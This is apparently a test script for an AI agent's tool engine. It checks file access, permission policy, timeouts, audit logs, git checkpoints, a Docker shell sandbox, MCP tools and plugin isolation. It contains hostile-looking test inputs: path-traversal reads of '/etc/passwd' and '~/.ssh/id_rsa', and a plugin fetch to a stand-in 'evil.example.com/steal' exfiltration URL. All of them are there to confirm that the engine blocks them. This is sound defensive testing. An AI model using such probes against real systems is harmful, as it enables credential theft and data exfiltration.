/**
 * Phase 4 — Tool Engine 검증.
 * File Read / File Write / Shell(Docker sandbox) / Git / MCP / Plugin.
 * 실패 케이스(권한 거부·경로 탈출·타임아웃·잘못된 인자·크래시)를 모두 포함한다 —
 * 도구 엔진의 가치는 성공 경로가 아니라 실패를 어떻게 가두느냐에 있다.
 */
import { execFile } from "node:child_process";
import { mkdtemp, readFile, writeFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { z } from "zod";
import {
  DEFAULT_POLICY, GitService, ToolExecutor, ToolRegistry,
  createRunCommandTool, listDirTool, readFileTool, registerMcpServer, writeFileTool,
} from "@aios/tools";
import type { ExecutionPolicy, ToolAuditRecord } from "@aios/tools";
import { Report } from "./report.js";

const exec = promisify(execFile);
const r = new Report("PHASE 4 — Tool Engine");

const root = await mkdtemp(join(tmpdir(), "aios-tools-"));
const audit: ToolAuditRecord[] = [];
const registry = new ToolRegistry();
registry.register(readFileTool);
registry.register(writeFileTool);
registry.register(listDirTool);

const baseCtx = { orgId: "org", userId: "user", sessionId: "sess", projectRoot: root };
const call = (name: string, args: Record<string, unknown>) => ({ id: `t_${Math.random().toString(36).slice(2)}`, name, arguments: args });

// 감사 로그를 메모리에 모아 검증
const auditFn = async (rec: ToolAuditRecord) => { audit.push(rec); };
const exe = new ToolExecutor(registry, DEFAULT_POLICY, auditFn);

try {
  // ---------- 4.1 File Write / Read ----------
  r.section("4.1 File write & read");
  await r.guard("fs", async () => {
    const w = await exe.execute(baseCtx, call("write_file", { path: "src/app.ts", content: "export const x = 1;\nexport const y = 2;\n" }));
    r.check("fs.write", w.ok, w.output.slice(0, 80));
    r.check("fs.write_creates_dirs", (await readFile(join(root, "src/app.ts"), "utf8")).includes("export const x"), "nested dir created");

    const rd = await exe.execute(baseCtx, call("read_file", { path: "src/app.ts" }));
    r.check("fs.read", rd.ok && rd.output.includes("export const x"), rd.output.split("\n")[0] ?? "");
    r.check("fs.read_line_numbers", /^1\t/.test(rd.output), "output is line-numbered");

    const ranged = await exe.execute(baseCtx, call("read_file", { path: "src/app.ts", startLine: 2, endLine: 2 }));
    r.check("fs.read_range", ranged.ok && ranged.output.trim().startsWith("2\t") && !ranged.output.includes("const x"),
      ranged.output.trim());

    const ls = await exe.execute(baseCtx, call("list_dir", { path: "." }));
    r.check("fs.list_dir", ls.ok && ls.output.includes("src/"), ls.output.replace(/\n/g, " "));
  });

  // ---------- 4.2 실패 케이스: path traversal, 없는 파일, 잘못된 인자 ----------
  r.section("4.2 Failure cases (fs)");
  await r.guard("fs.fail", async () => {
    for (const bad of ["../../../etc/passwd", "/etc/passwd", "src/../../outside.txt", "~/.ssh/id_rsa"]) {
      const res = await exe.execute(baseCtx, call("read_file", { path: bad }));
      r.check(`fs.jail(${bad.slice(0, 22)})`, !res.ok && /escapes|failed/i.test(res.output), res.output.slice(0, 70));
    }

    const missing = await exe.execute(baseCtx, call("read_file", { path: "does-not-exist.ts" }));
    r.check("fs.missing_file_is_soft_error", !missing.ok && !missing.output.includes("undefined"),
      missing.output.slice(0, 70));

    // 스키마 위반 → 모델에게 피드백으로 돌아가야 하고 throw 되면 안 된다
    const badArgs = await exe.execute(baseCtx, call("write_file", { path: 123, content: null }));
    r.check("fs.schema_validation", !badArgs.ok && /invalid arguments/.test(badArgs.output), badArgs.output.slice(0, 90));

    const unknown = await exe.execute(baseCtx, call("no_such_tool", {}));
    r.check("fs.unknown_tool", !unknown.ok && /unknown tool/.test(unknown.output), unknown.output);
  });

  // ---------- 4.3 정책: deny / confirm ----------
  r.section("4.3 Execution policy");
  await r.guard("policy", async () => {
    const denyPolicy: ExecutionPolicy = { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, write: "deny" } };
    const denyExe = new ToolExecutor(registry, denyPolicy, auditFn);
    let threw = false;
    try {
      await denyExe.execute(baseCtx, call("write_file", { path: "blocked.txt", content: "x" }));
    } catch (e) {
      threw = /denied/.test(String(e));
    }
    r.check("policy.deny_blocks", threw, "write denied by policy raised ToolDeniedError");

    let asked: string | null = null;
    const confirmExe = new ToolExecutor(registry,
      { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, write: "confirm" }, confirm: async (c) => { asked = c.name; return false; } },
      auditFn);
    const refused = await confirmExe.execute(baseCtx, call("write_file", { path: "asked.txt", content: "x" }));
    r.check("policy.confirm_denied", !refused.ok && asked === "write_file", `asked=${asked}, output="${refused.output}"`);

    const approveExe = new ToolExecutor(registry,
      { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, write: "confirm" }, confirm: async () => true }, auditFn);
    const approved = await approveExe.execute(baseCtx, call("write_file", { path: "approved.txt", content: "ok" }));
    r.check("policy.confirm_approved", approved.ok, approved.output.slice(0, 60));
  });

  // ---------- 4.4 출력 절단 & 타임아웃 ----------
  r.section("4.4 Output truncation & timeout");
  await r.guard("limits", async () => {
    await writeFile(join(root, "big.ts"), "x".repeat(200_000));
    const big = await exe.execute(baseCtx, call("read_file", { path: "big.ts" }));
    r.check("limits.output_truncated", big.ok && big.output.includes("truncated") && Buffer.byteLength(big.output) < 40_000,
      `${Buffer.byteLength(big.output)} bytes returned from a 200KB file`);

    // 타임아웃: 의도적으로 느린 도구 등록
    const slowRegistry = new ToolRegistry();
    slowRegistry.register({
      name: "slow", description: "sleeps", permission: "read", schema: z.object({}),
      handler: (ctx) => new Promise((res, rej) => {
        const t = setTimeout(() => res("done"), 5000);
        ctx.signal.addEventListener("abort", () => { clearTimeout(t); rej(new Error("aborted")); });
      }),
    });
    const fastTimeout = new ToolExecutor(slowRegistry, { ...DEFAULT_POLICY, timeoutMs: 400 }, auditFn);
    const t0 = Date.now();
    const timed = await fastTimeout.execute(baseCtx, call("slow", {}));
    r.check("limits.timeout_enforced", !timed.ok && /timed out/.test(timed.output) && Date.now() - t0 < 2000,
      `${timed.output} after ${Date.now() - t0}ms`);
  });

  // ---------- 4.5 감사 로그 ----------
  r.section("4.5 Audit logging");
  {
    const statuses = new Set(audit.map((a) => a.status));
    r.check("audit.every_call_recorded", audit.length >= 12, `${audit.length} records`);
    r.check("audit.captures_failures", statuses.has("ok") && statuses.has("error") && statuses.has("denied") && statuses.has("timeout"),
      `statuses observed: ${[...statuses].join(", ")}`);
    r.check("audit.has_duration", audit.every((a) => typeof a.durationMs === "number"), "all records carry durationMs");
  }

  // ---------- 4.6 Git ----------
  r.section("4.6 Git auto-commit");
  await r.guard("git", async () => {
    const repo = await mkdtemp(join(tmpdir(), "aios-git-"));
    await exec("git", ["init", "-q", "-b", "main"], { cwd: repo });
    await exec("git", ["config", "user.email", "t@t.local"], { cwd: repo });
    await exec("git", ["config", "user.name", "t"], { cwd: repo });
    const git = new GitService(repo);

    r.check("git.detects_repo", await git.isRepo(), "isRepo=true");
    r.check("git.no_commit_when_clean", (await git.autoCommit("nothing to do")) === null, "clean tree → null");

    await writeFile(join(repo, "a.txt"), "hello\n");
    const c1 = await git.autoCommit("add greeting file for the user");
    r.check("git.commits_changes", !!c1?.sha, `sha=${c1?.sha}`);
    r.check("git.message_format", !!c1 && c1.message.startsWith("aios: ") && c1.message.includes("[aios-checkpoint]"),
      `message="${c1?.message.split("\n")[0]}"`);

    const { stdout: log } = await exec("git", ["log", "--format=%an <%ae>%n%s", "-1"], { cwd: repo });
    r.check("git.author_identity", log.includes("AIOS Agent <agent@aios.dev>"), log.trim().split("\n")[0] ?? "");

    // 두 번째 커밋 후 롤백
    await writeFile(join(repo, "a.txt"), "hello\nbroken\n");
    const c2 = await git.autoCommit("break it");
    await git.revertTo(c1!.sha);
    const content = await readFile(join(repo, "a.txt"), "utf8");
    r.check("git.revert_to_checkpoint", !content.includes("broken"), `after revert of ${c2?.sha}: "${content.trim().replace(/\n/g, "\\n")}"`);

    // 비-git 디렉토리에서는 조용히 null (에러 아님)
    const plain = new GitService(root);
    r.check("git.non_repo_safe", (await plain.autoCommit("x")) === null, "non-repo → null, no throw");
  });

  // ---------- 4.7 Shell (Docker sandbox) ----------
  r.section("4.7 Shell sandbox (Docker)");
  const dockerUp = await exec("docker", ["info"], { timeout: 10_000 }).then(() => true).catch(() => false);
  if (!dockerUp) {
    r.check("shell.docker_available", false, "docker daemon not reachable — sandbox checks could not run");
  } else {
    await r.guard("shell", async () => {
      // 바인드 마운트는 Docker 호스트가 볼 수 있는 경로여야 한다.
      // macOS + colima/Docker Desktop은 기본적으로 $HOME 만 VM에 공유하므로
      // /var/folders(OS 임시 디렉토리)는 컨테이너에서 빈 디렉토리로 보인다.
      // 프로덕션(Linux)에서는 제약이 없지만, 검증은 실제로 마운트되는 경로에서 해야 의미가 있다.
      const home = process.env.HOME ?? root;
      const mountRoot = await mkdtemp(join(home, ".aios-sandbox-verify-"));
      await mkdir(join(mountRoot, "src"), { recursive: true });
      await writeFile(join(mountRoot, "src", "app.ts"), "export const x = 1;\n");
      const sandboxCtx = { ...baseCtx, projectRoot: mountRoot };

      const shellReg = new ToolRegistry();
      shellReg.register(createRunCommandTool({ image: process.env.SANDBOX_IMAGE ?? "aios-sandbox:latest", timeoutMs: 60_000 }));
      const shellExe = new ToolExecutor(shellReg,
        { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, exec: "confirm" }, confirm: async () => true, timeoutMs: 90_000 },
        auditFn);

      const ok = await shellExe.execute(sandboxCtx, call("run_command", { command: "echo SANDBOX-OK && ls" }));
      r.check("shell.executes", ok.ok && ok.output.includes("SANDBOX-OK"), ok.output.slice(0, 100).replace(/\n/g, " "));
      r.check("shell.mounts_project", ok.output.includes("src"),
        `workspace listing: ${ok.output.replace(/\n/g, " ").slice(0, 90)}`);

      const netBlocked = await shellExe.execute(sandboxCtx, call("run_command", { command: "curl -m 5 -sS https://example.com || echo NETWORK-BLOCKED" }));
      r.check("shell.network_blocked", netBlocked.output.includes("NETWORK-BLOCKED") || /could not resolve|failure|unreachable/i.test(netBlocked.output),
        netBlocked.output.slice(0, 110).replace(/\n/g, " "));

      const nonzero = await shellExe.execute(sandboxCtx, call("run_command", { command: "exit 42" }));
      r.check("shell.nonzero_is_failed_result", !nonzero.ok && nonzero.exitCode === 42 && nonzero.output.includes("exit code 42"), nonzero.output.slice(0, 60));

      const nonRoot = await shellExe.execute(sandboxCtx, call("run_command", { command: "id -u" }));
      r.check("shell.runs_nonroot", nonRoot.ok && !nonRoot.output.trim().startsWith("0"), `uid=${nonRoot.output.trim()}`);

      const readonly = await shellExe.execute(sandboxCtx, call("run_command", { command: "touch /etc/aios-probe 2>&1 || echo ROOTFS-READONLY" }));
      r.check("shell.readonly_rootfs", readonly.output.includes("ROOTFS-READONLY") || /read-only/i.test(readonly.output),
        readonly.output.slice(0, 90).replace(/\n/g, " "));

      // exec 권한이 deny면 실행 자체가 막혀야 한다
      const denied = new ToolExecutor(shellReg, { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, exec: "deny" } }, auditFn);
      let blocked = false;
      try { await denied.execute(sandboxCtx, call("run_command", { command: "echo nope" })); } catch { blocked = true; }
      r.check("shell.policy_deny", blocked, "exec denied by policy");
    });
  }

  // ---------- 4.8 MCP ----------
  r.section("4.8 MCP client");
  await r.guard("mcp", async () => {
    const mcpReg = new ToolRegistry();
    const client = await registerMcpServer(mcpReg, {
      name: "everything",
      command: "npx",
      args: ["-y", "@modelcontextprotocol/server-everything"],
      requestTimeoutMs: 90_000,
    });
    const names = mcpReg.list().map((t) => t.name);
    r.check("mcp.tools_projected", names.length > 0 && names.every((n) => n.startsWith("mcp__everything__")),
      `${names.length} tools, e.g. ${names.slice(0, 3).join(", ")}`);
    r.check("mcp.permission_is_net", mcpReg.list().every((t) => t.permission === "net"),
      "MCP tools inherit the confirm-by-default 'net' permission");

    // MCP 도구도 동일한 executor 관문(정책·감사)을 통과해야 한다
    const mcpExe = new ToolExecutor(mcpReg,
      { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, net: "confirm" }, confirm: async () => true }, auditFn);
    const res = await mcpExe.execute(baseCtx, call("mcp__everything__echo", { message: "MCP-VIA-EXECUTOR" }));
    r.check("mcp.call_through_executor", res.ok && res.output.includes("MCP-VIA-EXECUTOR"), res.output.slice(0, 80));

    const auditedMcp = audit.filter((a) => a.toolName.startsWith("mcp__"));
    r.check("mcp.audited", auditedMcp.length > 0, `${auditedMcp.length} MCP invocations audited`);

    // 정책이 net을 막으면 MCP 도구도 막혀야 한다 (외부 도구가 관문을 우회하지 않는지)
    const blockedExe = new ToolExecutor(mcpReg, { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, net: "deny" } }, auditFn);
    let blocked = false;
    try { await blockedExe.execute(baseCtx, call("mcp__everything__echo", { message: "x" })); } catch { blocked = true; }
    r.check("mcp.policy_applies", blocked, "net=deny blocks MCP tools too");

    // 존재하지 않는 MCP 도구 호출 → 에러가 소프트하게 반환
    const bad = await mcpExe.execute(baseCtx, call("mcp__everything__nonexistent_tool", {}));
    r.check("mcp.unknown_tool_soft_fail", !bad.ok, bad.output.slice(0, 80));

    await client.close();
  });

  // ---------- 4.9 Plugin host ----------
  r.section("4.9 Plugin host (worker isolation + capability bridge)");
  await r.guard("plugin", async () => {
    const { createHash } = await import("node:crypto");
    const { loadPlugin, parseManifest } = await import("@aios/plugin-host");
    const pluginDir = join(root, "plugin");
    await mkdir(pluginDir, { recursive: true });

    const manifest = parseManifest({
      name: "verify-plugin", version: "1.0.0", displayName: "Verify",
      entry: "index.js", engines: { aios: ">=0.1.0" },
      permissions: ["tools.register", "storage.kv", "net.fetch:api.github.com"],
      contributes: { tools: [{ name: "kv_roundtrip", description: "store and read a value" }] },
    });

    // 플러그인 번들: 도구 등록 + KV 사용 + 비허용 호스트 fetch 시도(차단되어야 함)
    const bundle = `
import { parentPort } from "node:worker_threads";
let seq = 0; const pending = new Map();
function rpc(method, params) {
  return new Promise((resolve, reject) => {
    const id = ++seq; pending.set(id, { resolve, reject });
    parentPort.postMessage({ id, method, params });
  });
}
const handlers = {
  async kv_roundtrip(args) {
    await rpc("kv.set", { key: "k", value: String(args.value) });
    const got = await rpc("kv.get", { key: "k" });
    return "kv=" + got.value;
  },
  async try_forbidden_host() {
    try { await rpc("fetch", { url: "https://evil.example.com/steal" }); return "FETCH-ALLOWED"; }
    catch (e) { return "FETCH-BLOCKED: " + String(e.message || e); }
  },
};
parentPort.on("message", async (msg) => {
  if (msg.method === "tool.invoke") {
    const { name, args } = msg.params;
    try { parentPort.postMessage({ id: 0, method: "tool.result", params: { id: msg.id, output: await handlers[name](args) } }); }
    catch (err) { parentPort.postMessage({ id: 0, method: "tool.result", params: { id: msg.id, error: String(err) } }); }
    return;
  }
  const p = pending.get(msg.id);
  if (p) { pending.delete(msg.id); msg.error ? p.reject(new Error(msg.error)) : p.resolve(msg.result); }
});
await rpc("tools.register", { name: "kv_roundtrip", description: "store and read a value" });
await rpc("tools.register", { name: "try_forbidden_host", description: "attempt a disallowed fetch" });
`;
    const bundlePath = join(pluginDir, "index.mjs");
    await writeFile(bundlePath, bundle);
    const sha = createHash("sha256").update(await readFile(bundlePath)).digest("hex");

    const kv = new Map<string, string>();
    const pluginReg = new ToolRegistry();
    const loaded = await loadPlugin(bundlePath, manifest, sha, null, {
      registry: pluginReg,
      granted: ["tools.register", "storage.kv", "net.fetch:api.github.com"],
      kv: { get: async (k) => kv.get(k) ?? null, set: async (k, v) => { kv.set(k, v); } },
    });

    await new Promise((res) => setTimeout(res, 800)); // 워커 부팅 + 도구 등록 대기
    const pluginTools = pluginReg.list().map((t) => t.name);
    r.check("plugin.registers_tools", pluginTools.length === 2, `registered: ${pluginTools.join(", ")}`);

    const pluginExe = new ToolExecutor(pluginReg,
      { ...DEFAULT_POLICY, modes: { ...DEFAULT_POLICY.modes, net: "confirm" }, confirm: async () => true }, auditFn);

    const kvRes = await pluginExe.execute(baseCtx, call("plugin__verify-plugin__kv_roundtrip", { value: 42 }));
    r.check("plugin.capability_kv", kvRes.ok && kvRes.output.includes("kv=42"), kvRes.output.slice(0, 60));
    r.check("plugin.kv_namespaced", [...kv.keys()].every((k) => k.startsWith("plugin:verify-plugin:")),
      `keys: ${[...kv.keys()].join(", ")}`);

    const fetchRes = await pluginExe.execute(baseCtx, call("plugin__verify-plugin__try_forbidden_host", {}));
    r.check("plugin.host_allowlist_enforced", fetchRes.ok && fetchRes.output.includes("FETCH-BLOCKED"),
      fetchRes.output.slice(0, 110));

    // 무결성: 해시 불일치 번들은 로드 거부
    let integrityBlocked = false;
    try {
      await loadPlugin(bundlePath, manifest, "0".repeat(64), null, {
        registry: new ToolRegistry(), granted: [], kv: { get: async () => null, set: async () => {} },
      });
    } catch (e) { integrityBlocked = /integrity|sha/i.test(String(e)); }
    r.check("plugin.integrity_check", integrityBlocked, "sha256 mismatch rejected");

    // 미승인 권한: manifest에 있어도 granted가 아니면 거부되어야 한다
    const reg2 = new ToolRegistry();
    const loaded2 = await loadPlugin(bundlePath, manifest, sha, null, {
      registry: reg2, granted: [], // 아무 권한도 승인하지 않음
      kv: { get: async () => null, set: async () => {} },
    });
    await new Promise((res) => setTimeout(res, 800));
    r.check("plugin.ungranted_permission_blocked", reg2.list().length === 0,
      `${reg2.list().length} tools registered without tools.register grant (expected 0)`);
    await loaded2.stop();

    await loaded.stop();
    r.check("plugin.unload_removes_tools", pluginReg.list().length === 0, "tools withdrawn on stop");
  });
} finally {
  /* tmp dirs는 OS가 정리 */
}

r.finish();
